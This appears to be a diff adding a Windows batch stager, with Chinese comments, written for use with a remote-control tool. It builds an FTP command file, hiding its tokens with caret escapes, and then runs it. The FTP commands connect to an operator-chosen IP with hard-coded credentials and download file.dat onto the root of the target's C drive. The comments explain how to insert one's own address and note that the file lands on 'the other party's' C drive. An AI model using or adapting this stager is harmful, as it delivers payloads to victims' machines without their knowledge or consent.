@@ -1,0 +1,10 @@
+del /f /q "C:/ftpc.txt"
+echo open^ 192^.168^.40^.191^  >>C:/ftpc.txt
+echo user^ removectrl^ 1^  >>C:/ftpc.txt
+echo get^ file^.dat^ c^:^/file^.dat >>C:/ftpc.txt
+echo bye^  >>C:/ftpc.txt
+ftp -n -s:C:/ftpc.txt
+
+//将第三行改为你自己的ip地址（在远控工具盒上显示的本IP地址)
+//例如 192.168.142.128 改为 echo open^ 192^.168^.142^.128^  >>C:/ftpc.txt
+//文件默认传输到对方c盘更目录下
